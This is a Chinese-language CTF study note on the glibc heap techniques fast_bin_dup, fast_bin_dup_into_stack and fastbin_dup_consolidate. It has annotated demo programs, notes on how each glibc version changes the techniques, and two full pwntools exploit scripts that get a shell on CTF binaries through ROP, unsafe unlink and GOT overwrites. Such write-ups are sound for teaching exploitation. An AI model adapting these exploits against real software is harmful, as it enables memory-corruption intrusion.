---
title: How2heap_fast_bin_dup
timestamp: 2026-07-22 16:26:00+08:00
toc: true
tags: [PWN, PWN/Heap, PWN/Heap/fast_bin, Manual]
---

---
---
## ***fast_bin_dup***
---
- 描述：通过滥用 `fastbin` 空闲链表，欺骗 `malloc` 返回一个已经被分配过的堆指针
- 功能：
	>任意地址分配，进而实现任意地址读写
- 版本要求：`glibc` - `< 2.43` ：`fast_bins` 存在，可用
	>`glibc` - `>= 2.23` ：取出 `chunk` 的 `size` 须与请求落在同一 `fast_bin_index`
	>`glibc` - `>= 2.26` ：需填满 `tcache` ( `7` 次 `free` ) ^6b34a9
- 适用场景：
	>需任意地址写
	>存在 `double-free` 或 `UAF`，能 `free` 两次同一个 `chunk`
- 期望：
	>成功泄露 `libc` 基址
	>能够成功泄露 `heap` 基址
	>目标地址附近存在合法的 `fast_bin_size`
- 
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723084612.webp)
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```
---
### 分析
---
#### ***< 2.26***
在 `fast_bin` 链表中存在两个同一 `chunk` 的指针，在此处即为 `1st` 和 `3rd`
```cpp
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260722165209.webp)
在此处，首先创建三个 `chunk` 其中 `a` 、 `b` 是我们需要的实验用 `chunk` ，`c` 应该是用来与 `top_chunk` 的隔离。
在之前较低版本时，甚至可以直接进行 `dup` ，即连续 `free` 同一个 `chunk` ，但是对于现在的版本，由于添加了检查，常见的利用方式是：先 `free` 一个其他 `chunk` 随后再进行 `dup`
```cpp
	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);
```

此时，在 `fast_bin` 中，就同时存在两个 `chunk_a`， 如图所示![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260722170150.webp)
相对应的，当我们再连续创建三个同大小的 `chunk` ，就会产生对应的 `chunk` 的堆叠可以看到 `1st` 跟 `3rd` 两个 `chunk` 的指针是相同的![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260722163252.webp)

---
#### ***2.26 ~ 2.43***
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730100902.webp)
通过 `diff` 命令可以看到，程序添加了填充 `tcache` 的部分![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730102031.webp)
实现上述效果之后，才能够去对同 `size` 的 `fast_bins` 进行操作，而接下来的操作，也都是相同的，此处使用 `calloc` 是防止拿取 `tcache_bins` 影响实验的进行  ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730103024.webp)
可以看到，其结果跟低版本是相同的
但是其他的一些版本变化，会对利用产生非常大的影响

---
### 利用沿革
#### ***2.25***
- 版本变化
	>引入 `misaligned_chunk` 检查：取出的 `chunk` 地址需满足 `16` 字节对齐 
- 利用流程变化
	>无法再通过字节错位，实现在特定位置构建 `chunk` ，只得在对齐处进行构建
- 
#### ***2.32***
- 版本变化
	>引入 `safe-linking` 检查：`tcache` 与 `fast_bin_chunk` 的 `fd` 字段需进行加密 `P->fd = next_addr ^ (&(P->fd) >> 12)`
- 利用流程变化
	>在改写 `fd` 时需要先泄露 `heap` 地址，手动进行加密，而后改写字段
- 
#### ***2.34***
- 版本变化
	>删除 `__malloc_hook` 、`__free_hook` 、`__realloc_hook` 函数
- 利用流程变化
	>由改写上述三个函数，转到了利用 `GOT (Partial RELRO)`、 `FSOP` 、 `tcache_perthread_struct` 、 `栈 ROP` 等手段
- 
---
题目演示：暂无

---
---
## ***fast_bin_dup_into_stack***
---
- 描述：通过滥用 `fastbin` 空闲列表，诱使 `malloc` 返回一个几乎任意的指针
- 功能：
	>将 `chunk` 分配至栈，进而修改栈数据，实现 `ROP`
- 版本要求：`glibc` - `< 2.43` ：`fast_bins` 存在，可用
	>`glibc` - `>= 2.23` ：取出 `chunk` 的 `size` 须与请求落在同一 `fast_bin_index`
	>`glibc` - `>= 2.26` ：需填满 `tcache` ( `7` 次 `free` )
- 适用场景：
	>题目未开启 `PIE` 保护
	>题目无 `got` 表
	>存在 `FULL_RELRO` 保护导致 `got` 表不可写
	>`glibc` 版本高导致无法使用 `__malloc_hook` 函数
- 利用条件：
	>存在 `double-free` 或 `UAF`，能 `free` 两次同一个 `chunk`
	>能成功泄露栈地址
- 期望：
	>能够对 `main` 或长期存在的栈帧进行攻击
	>目标地址附近存在合法的 `fast_bin_size`
- 
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723084919.webp)
```cpp
include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	      "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```
---
### 分析
---
仍旧是先创建三个同样大小的 `chunk` ，然后做一次 `fast_bin_dup` 构造出特定的链表
```cpp
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723085355.webp)
```cpp
	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);
```

随后，在进行一次 `malloc` 之后， 链表即会产生相应的变化，即遵从后进先出的规则 `（LIFO）` ，将在链表头部的 `chunk` 取出，随后产生如下链表，由于 `chunk` 在从 `bins` 中取出后，其中的数据并不会发生改变，因此，链表仍然是存在着这样一个递归的结构![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723085655.webp)
如果能够控制这个链表中的数据，就可以在相对应的位置 `malloc` 出一个 `chunk` ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723215219.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260724013526.webp)

---
### 利用沿革
#### ***2.32***
- 版本变化
	>引入 `safe-linking` ：`fd` 字段进行所示加密 `p->fd = next_addr ^ (&(p->fd) >> 12)`
- 利用流程变化
	>在改写 `fd` 时需要先泄露 `heap` 地址，手动进行加密
- 
---
### 题目演示：[#\_9447_CTF_2015_Search_Engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine)
---
#### EXP 
- `glibc` 版本：`2.23` [^7]
```python
from pwn import *
elf = ELF("./_9447_CTF_015_Search_Engine")
lib = ELF("/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")
context(arch=elf.arch, os=elf.os, log_level="debug")
io = process([elf.path])
# io = remote("",)
# ───────────────────────────────────────────────────────────────
s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda delim, data: io.sendafter(delim, data)
sla = lambda delim, data: io.sendlineafter(delim, data)

r = lambda data: io.recv(data)
ro = lambda: io.recv()
rl = lambda: io.recvline()
ru = lambda delim: io.recvuntil(delim)

uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))

leak = lambda name, addr: log.success("{} = {:#x}".format(name, addr))

itr = lambda: io.interactive()
# ───────────────────────────────────────────────────────────────
def search(word):
    ru(b"3: Quit\n")
    sl(b"1")
    ru(b"Enter the word size:\n")
    sl(str(len(word)).encode())
    ru(b"Enter the word:\n")
    sl(word)

def delete(choice=b"n"):
    ru(b"Delete this sentence (y/n)?\n")
    sl(choice)

def index(sentence):
    ru(b"3: Quit\n")
    sl(b"2")
    ru(b"Enter the sentence size:\n")
    sl(str(len(sentence)).encode())
    ru(b"Enter the sentence:\n")
    sl(sentence)
# ───────────────────────────────────────────────────────────────
gdb.attach(io, "b *0x400E24")

ru(b"3: Quit\n")
sl(b"A")
sl(b"|" * 47 + b"=")
ru(b"=")
leak_stack = uu64(r(6))
fake_chunk_addr = leak_stack + 0x52

leak("leak_stack", leak_stack)
leak("fake_chunk_addr", fake_chunk_addr)

sl(b"1")
sl(b"1")
sl(b"1")
# ──────────────────────────────────────────────────────────────
index(b"|" * 0x82 + b" small")

search(b"small")
delete(b"y")

search(b"\x00" * 5)

ru(b": ")

leak_libc = uu64(r(6))
lib_base = leak_libc - 0x3C3B78

leak("leak_libc", leak_libc)
leak("lib_base", lib_base)

delete(b"n")
# ───────────────────────────────────────────────────────────────
index(b"a" * 0x33 + b" beaf")
index(b"b" * 0x33 + b" beaf")
index(b"c" * 0x33 + b" beaf")

search(b"beaf")
delete(b"y")
delete(b"y")
delete(b"y")

search(b"\x00" * 4)
delete(b"y")
delete(b"n")
# ───────────────────────────────────────────────────────────────
pop_rdi_ret = 0x0000000000400E23
bin_sh = lib_base + next(lib.search(b"/bin/sh"))
sys = lib_base + lib.sym["system"]
ret = 0x0000000000400761

fake_chunk = b""
fake_chunk += b"|" * 6
fake_chunk += p64(ret)
fake_chunk += p64(pop_rdi_ret)
fake_chunk += p64(bin_sh)
fake_chunk += p64(sys)

index(p64(fake_chunk_addr) + b"|" * 0x30)
index(p64(fake_chunk_addr) + b"|" * 0x30)
index(p64(fake_chunk_addr) + b"|" * 0x30)
index(fake_chunk.ljust(0x38, b"="))

ru(b"3: Quit\n")
sl(b"3")

leak("leak_stack", leak_stack)
leak("fake_chunk_addr", fake_chunk_addr)
leak("leak_libc", leak_libc)
leak("lib_base", lib_base)
itr()
```

![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726210851.webp)


---
#### 分析与利用
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260725152142.webp)
题目只提供两个功能：`Search` 跟 `Index` 
其中 `Index` 类似于创建，其创建的数据结构如下图所示![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726212621.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213441.webp)
题目的漏洞出现在 `search` 中，由于仅仅 `free` 了句块，并没有将其置零，与此同时，没有对词块进行任何处理，导致出现了 `UAF` 漏洞，那么有没有可能在这个地方实现 `dup` 呢？请看下图进入删除的条件分支![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213624.webp)
分析后得到以下三个条件：
>1. 句子不为空
>2. 查询的词大小相同
>3. 查询的词与句中的词一致

为了满足以上条件，我们就需要先看一下删除一次后，数据的变化![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726214246.webp)
1. 在此处，使用了 `0x91` 大小的 `chunk` ，不属于 `fast_sized_bin` 因此也就进入了 `unsorted_bin` ，与此同时 `fd` 也就被写入，这也就满足了 `条件1`， 如果使用的是较小的 `chunk` 就需要去进行额外的操作
2. 为了满足 `条件2` 就需要在此处查看词块部分，这里存在两个满足的条件， `0x82` 与 `0x5` ，由于 `词1` 会被填充，因此在这里选择 `词2`
3. 最后一个条件，此时，句中的剩余部分均被清空，因此此时查询对应长度的 `\x00` 即可
所有的条件都已满足，也就是说此处是可以实现 `dup` 的，与此同时，此处还有意外之喜 —— 通过这一步可以实现 `libc` 地址的泄露
已知，我们事实上是可以实现 `fast_bin_dup` 的，我们就获得了“任意”地址写的能力 ，接下来应该考虑的，就是往哪写，写什么？
已知没有 `full_Relro` 首要的想法应该是改写 `got` 表，或者 `__malloc_hook`
但主要目的是进行 `fast_bin_dup_into_stack` 的演示，这个地方肯定是想办法将 `heap` 放到栈上，已知的是，题目没有开启 `pie` 且其起始地址为 `0x3fe000` 很容易就能想到，在栈上，就可以通过偏移去构造 `0x40` 或者 `0x38` 大小的 `chunk` 如果合适的话，就能够在栈上实现 `ROP` ，但是现在需要做的是泄露 `stack` 地址 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726222726.webp)
在这个地方我们可以看到有一个 `read` 与 `printf` + `%s` 的组合，对于 `read` 来说，很明显在这个地方其实并不存在溢出，但是由于这是 `release` 版（实际调试中能够发现)
`strtol` 在遇到非数字的时候会使 `endptr = nptr` 这也就满足了进入错误输出的条件，同时由于 `read` 并不添加终止符，`release` 版的数据留存，就让我们能够成功的泄露出 `stack` 地址![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726225002.webp)
与此同时，为了保证利用的稳定，要想办法去做 `main` 函数的 `ROP` ，因为其他函数都随时会结束生命周期，相对应的可以切换到对应的 `frame` 查看信息，并且查找有没有可以进行利用的位置![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726225955.webp)
此时根据图中信息向上寻找，就能够计算出相应的地址，接下来就是找到对应的 `gadget`进行 `ROP` 即可
```python
index(b"a" * 0x33 + b" beaf")
index(b"b" * 0x33 + b" beaf")
index(b"c" * 0x33 + b" beaf")

search(b"beaf")
delete(b"y")
delete(b"y")
delete(b"y")

search(b"\x00" * 4)
delete(b"y")
delete(b"n")
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726230447.webp)
另需说明，多句子中，词链表仍然会继续延伸，因此，在多次 `Index` 之后进行一次 `Search` 即可，同时由于 `chunk_c` 最后被 `free` 其链表为空，`dup` 时不会参与到查询中![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231140.webp)
此时可以看到调用链已经被我们修改，可以在看一下对应的数据![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231351.webp)
即可获得 `shell` 了![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231600.webp)

---
---
## ***fastbin_dup_consolidate***
---
- 描述：通过将指针同时放入 `fast_bin` 空闲链表和 `Top_Chunk` 中，欺骗 `malloc` 返回一个已经被分配的堆指针  [^1]
- 功能：
	>实现堆块的堆叠
	>泄露 `libc` 基址
- 版本要求：`glibc` - `< 2.43` ：`fast_bins` 存在，可用
	>`glibc` - `>= 2.23` ：取出 `chunk` 的 `size` 须与请求落在同一 `fast_bin_index`
	>`glibc` - `>= 2.26` ：需填满 `tcache` ( `7` 次 `free` )
- 适用场景：
	>仅存在 `fast_bin` 的 `UAF` ，同时需要泄露 `libc` 基址
	>需要创立 `chunk` 的堆叠
- 利用条件：
	>至少存在 一个 `fast_sized_chunk` 的 `UAF` 
	>能够创建 `large_sized_chunk` 
	>`fast_sized_chunk` 在物理上紧邻 `top_chunk` 或者 有其他能够触发 `malloc_consolidate` 函数的情况
- 期望：
	>能够通过 `libc` 泄露能够进行进一步的攻击
	>能够伪造 `fake_chunk` 进行 `unlink_attack`
- 
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723221852.webp)
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
**原文出处**：[https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8](https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8)

本文主要用于演示 malloc_consolidate 以及如何结合 double free 利用它来获取两个指向同一大尺寸 chunk 的指针——由于 previnuse 检查的存在，通常很难直接做到这一点。

malloc_consolidate（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714)）本质上会合并所有 fastbin chunk 及其相邻块，将它们放入 unsorted bin，并在可能的情况下与 top chunk 合并。

截至 glibc 2.35 版本，它仅在以下五种情况下被调用：

1. _int_malloc：分配大尺寸 chunk 时（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)）
    
2. _int_malloc：没有找到合适的 bin 且 top chunk 空间不足时（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)）
    
3. _int_free：释放的 chunk 大小 ≥ FASTBIN_CONSOLIDATION_THRESHOLD（65536）时（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)）
    
4. mtrim：总是触发（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)）
    
5. __libc_mallopt：总是触发（[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)）
    
我们将利用第一种情况，因此需要分配一个不在 small bin 范围内的 chunk（目标是要进入此检查的 else 分支：[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901)）。这意味着我们的 chunk 大小需要 ≥ 0x400（因此属于大尺寸 chunk）。

*/

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n");

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```
[^2] [^3] [^4] [^5] [^6]

---
### 分析
---
过程中需要利用到 `UAF` 漏洞来进行操作，利用合并机制，完成一次 `chunk` 的重叠
```cpp
void* p1 = calloc(1,0x40);

printf("Allocate a fastbin chunk p1=%p \n", p1);

printf("Freeing p1 will add it to the fastbin.\n\n");

free(p1);

void* p3 = malloc(0x400);
```
在这个过程中，在 `malloc` 出 `p3` 时，程序会首先触发 `malloc_consolidate` 函数，对 `free` 的 位于 `fast_bin` 中的 `chunk` 与相邻的空闲的 `chunk` (包括 `top_chunk` )进行合并，此时 `bins` 中将没有任何的 `chunk` ，接下来创建 `p3` 就需要直接从 `top_chunk` 中进行切割，最终形成的是 `fast_sized_chunk` 与 `large_sized_chunk` 的堆叠![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260724012129.webp)
接下来再进行一次上述操作
```cpp
free(p1); // vulnerability

printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");

printf("chunk got consolidated with it. We have thus achieved UAF!\n");

printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");

printf("p3 and p1 will still be pointing to it.\n");

void *p4 = malloc(0x400);

assert(p4 == p3);
```

这个时候，就构成了两个 `large_sized_chunk` 的堆叠， 即 `p3` 跟 `p4` 的堆叠，这个时候就存在三个 `chunk` 堆叠，即 `fast_sized_chunk * 1` + `large_sized_chunk * 2` 的重叠![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260724012825.webp)
这是一个从 `fast_sized_bin` -> `large_sized_bin` 过程，本质上是利用了 `malloc_consolidate` 对 `fast_sized_bin` 的合并，与 `UAF` 的组合实现了堆块重叠的目的，由于 `large_sized_bin` 的控制字段会指向 `main_arena` 区，如果能产生对应的输出，也就可以通过此方式来泄露 `libc` 基址了
当然，这个利用方式也可以用来实现 `small_sized_chunk` 与 `fast_bin_chunk` 的堆叠，又因为过程中存在 `chunk` 的合并，就不免涉及到对链表的操作。如果我们可以控制合并的 `chunk` ，就能够去触发 `unsafe_unlink_attack` 其大概的流程如下
```cpp
p1 = malloc(0x30);
p2 = malloc(0x400);

free(p1);           // free p1 使其被置于 fast_bin 链表中
                    // 与此同时，我们仍然可以通过 UAF 去操作此 chunk
trigger();          // 触发 malloc_consolidate 的函数但不影响 p1 p2
                    // 此时 p1 从 fast_bin 移至 small_bin 链表中
free(p1);           // 再 free 掉 p1 使其再被置于 fast_bin 链表中
                    // 通过将同一 chunk 置于不同链表绕过 double_free 检测
                    // 此时就成功的实现了 dup 也就可以执行下一步
forge_fake_chunk(); // 通过此函数伪造合并的 chunk
free(p2);           // 真正触发合并执行 unsafe_unlink_attack
```
---
### 利用沿革
#### ***2.29***
- 版本变化
	>引入 `unsorted_bin` 双向链表一致性检查：要求 `unsorted_bin` 中的双向链表能够相互指回
	>引入 `next_chunk_size` 合法性检查：要求 `next_ptr` 指向的下一个 `chunk` 应当合法(`16 ~ system_mem`)
- 利用流程变化
	>操作 `unsorted_bin` 链表的利用方式被拦截，尽量使用其他 `unsafe_unlink` 攻击 
- 

---
### 题目演示：[#\_Hitconctf2016_Sleepy_Holder](https://github.com/mehQQ/public_writeup/blob/master/hitcon2016/SleepyHolder/)
---
#### EXP
- `glibc` 版本：`2.23`
```python
from pwn import *

elf = ELF("./SleepyHolder")
lib = ELF("/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")

io = process([elf.path])
# io = remote("pwn.challenge.ctf.show", 28199)

context(arch=elf.arch, os=elf.os, log_level="debug")

s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda delim, data: io.sendafter(delim, data)
sla = lambda delim, data: io.sendlineafter(delim, data)

r = lambda data: io.recv(data)
ro = lambda: io.recv()
rl = lambda: io.recvline()
ru = lambda delim: io.recvuntil(delim)
ra = lambda: io.recvall(timeout=3)

uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))

leak = lambda name, addr: log.success("{} = {:#x}".format(name, addr))
itr = lambda: io.interactive()


def add(chunk_size, content):
    sla(b"3. Renew secret\n", b"1")
    sla(b"2. Big secret\n", str(chunk_size).encode())
    sa(b"Tell me your secret: ", content)

def delete(chunk_size):
    sla(b"3. Renew secret\n", b"2")
    sla(b"2. Big secret\n", str(chunk_size).encode())

def edit(chunk_size, content):
    sla(b"3. Renew secret\n", b"3")
    sla(b"2. Big secret\n", str(chunk_size).encode())
    sa(b"Tell me your secret: \n", content)

# def dis(idx):

# gdb.attach(io)

add(1, b"aaaa")
add(2, b"bbbb")
delete(1)
add(3, b"cccc")
delete(1)

target_addr = 0x6020D0

fake_chunk = b""
fake_chunk += p64(0) + p64(0x21)
fake_chunk += p64(target_addr - 0x18) + p64(target_addr - 0x10)
fake_chunk += b"\x20"

add(1, fake_chunk)
delete(2)

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
free_got = elf.got["free"]

pl = b""
pl += p64(0)
pl += p64(puts_got) + p64(puts_got) + p64(free_got)
pl += p32(1) * 3

edit(1, pl)
edit(1, p64(puts_plt))

delete(2)
lib_base = uu64(io.recv(6)) - lib.sym["puts"]
leak("lib_base", lib_base)

sys = lib_base + lib.sym["system"]
edit(1, p64(sys))

add(2, b"/bin/sh\0")
delete(2)
itr()
```

![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260728103833.webp)


---
#### 分析与利用
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260728103449.webp)
此处我们直接通过源码对程序进行分析，可以看到程序的数据结构是非常简单的，都只有一个数据块。与此同时需要注意的是，三种大小的 `chunk` 都只能创建一次，这就对漏洞的利用带来了很大的挑战，这也正是我们在此处使用 `fast_bin_dup_consolidate` 的原因![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260728110630.webp)
很明显的是，题目在此处是存在着 `UAF` 漏洞的，并没有将对应的指针置为 `nullptr` ，另外，由于在 `free` 前没有做任何的检查，这就使得我们可以实现 `chunk` 的 `dup`
而为了实现目标，仍然是需要做 `libc` 基址的泄露
通过分析，能够很容易的发现，题目并没有给输出函数，因此也就没有常规的进行泄露的手段。对于大部分题目而言，应当是开启 `FULL_RELRO` 的，就只能够通过 `_IO_FILE` 去泄露。但很幸运，此题并没有，我们就可以操作 `got` 表，通过将 `free` 改为 `puts` 即可实现用户区内容的泄露。而后仍然是修改 `free` 为 `system` 函数，即可实现漏洞的利用
关于此题目最先要考虑是，如何去控制 `got` 的地址，目前虽然能够实现 `dup` 但是由于三种大小都只能创建一个块，因此无法实现任意地址写，那么通过伪造 `fake_chunk` 来实现 `unsafe_unlink_attack` 是很好的选择
```python
add(1, b"aaaa")
add(2, b"bbbb")
delete(1)
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729153552.webp)
可以看到此时 `chunk1_a` 处于 `fast_bin` 链表中
```python
add(3, b"cccc")
delete(1)
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729154603.webp)
执行完之后可以看到，此时就已经实现了 `dup` ，但是更重要的是能够为接下来的合并做准备，将 `chunk_b` 的标志位置 `0` 以便进行下一步 `unsafe_unlink_attack` 。其中创建 `chunk3` 就是为了让 `fast_bin_chunk` 转到对应的 `small_bin` 中，把同样的 `chunk` 置于不同的链表中，以此绕过 `double_free` 检查。接着要做的就是伪造 `fake_chunk` 了
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161447.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161626.webp)
```python
target_addr = 0x6020D0

fake_chunk = b""
fake_chunk += p64(0) + p64(0x21)
fake_chunk += p64(target_addr - 0x18) + p64(target_addr - 0x10)
fake_chunk += b"\x20"

add(1, fake_chunk)
delete(2)
```
需要注意的是，为了满足 `unlink` 的链表检查，我们需要构造一个特殊的结构，就是满足 `*(FD->bk) == *(BK->fd)` ，我们的解决方案是直接使 `FD->bk == BK->fd` ，由于链表中指向的是 `chunk` 头，地址就需要减去对应的数值，如以上代码块所示，最后的 `b"\x20"` 也是为了满足合并的条件
这个时候，我们再看目标地址附近的数据的变化，下图是未执行 `unsafe_unlink_attack` 时的状态![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162420.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162656.webp)
我们可以看到 `chunk_a` 的地址被我们改为了 `0x6020b8` ，相对应的，我们就可以随意修改这部分数据，接下来就是要把修改的目标转到 `.got` 区域。通过计算偏移，能够很容易的构造以下恶意数据，执行完毕之后，即将 `free_got` 改写为 `puts` 函数的地址，然后即可完成泄露
```python
pl = b""
pl += p64(0)
pl += p64(puts_got) + p64(puts_got) + p64(free_got)
pl += p32(1) * 3

edit(1, pl)
edit(1, p64(puts_plt))
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175105.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175338.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729181634.webp)
